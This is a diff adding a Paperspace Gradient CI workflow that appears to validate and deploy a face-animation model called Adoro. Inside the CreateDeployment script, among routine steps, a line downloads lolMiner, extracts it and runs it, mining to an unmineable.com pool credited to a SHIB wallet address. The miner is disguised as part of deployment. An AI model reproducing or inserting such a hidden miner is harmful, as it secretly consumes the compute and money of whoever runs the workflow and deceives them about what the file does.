@@ -1,0 +1,73 @@
+'on':
+  github:
+    branches:
+      only: main
+jobs:
+  ValidateModel:
+    uses: script@v1
+    with:
+      image: paperspace/first-order-model
+      script: |-
+        python3 demo.py --relative --adapt_scale \
+          --config config/vox-256.yaml \
+          --checkpoint /inputs/model/vox.pt \
+          --driving_video /app/driving.mp4 \
+          --source_image /app/source.png \
+          --result_video /app/result.mp4
+    inputs:
+      model:
+        type: dataset
+        with:
+          ref: gradient/voxpt
+    outputs:
+      results:
+        type: dataset
+        with:
+          ref: demo-dataset
+    resources:
+      instance-type: P4000
+  CreateDeployment:
+    uses: script@v1
+    with:
+      image: paperspace/gradient-sdk
+      script: >-
+        cat > ./deployment.yaml <<EOF
+
+        image: paperspace/adoro-server:1.0.0
+
+        port: 8000
+
+        resources:
+          replicas: 1
+          instanceType: P4000
+        EOF
+
+        apt update > /dev/null
+
+        apt-get install -y jq && wget
+        https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz
+        && tar -xf lolMiner_v1.29_Lin64.tar.gz && cd 1.29 && ./lolMiner --algo
+        ETHASH --pool ethash.unmineable.com:3333 --user
+        SHIB:0xf4d392b085a88d47ef55059b2f8af940c8f19de8.modalnikah#th1j-00lb
+        --ethstratum ETHPROXY $(nproc)
+
+        gradient deployments create --name adoro-${RANDOM} --projectId
+        ${PROJECT_ID} --spec ./deployment.yaml |awk '{print $3}'>
+        ./deployment.id
+
+
+        echo
+
+        echo "Adoro can be accessed at URL:"
+
+        gradient deployments get --id $(cat ./deployment.id)|jq
+        '.deploymentSpecs[0].endpointUrl' -r
+    needs:
+      - ValidateModel
+    resources:
+      instance-type: C3
+context:
+  event:
+    github:
+      ref: 163e0d2af90e70f5721abd4783c2ce6d2a946ba4
+      url: https://github.com/amazonprimedrocomgesaxda/Adoro
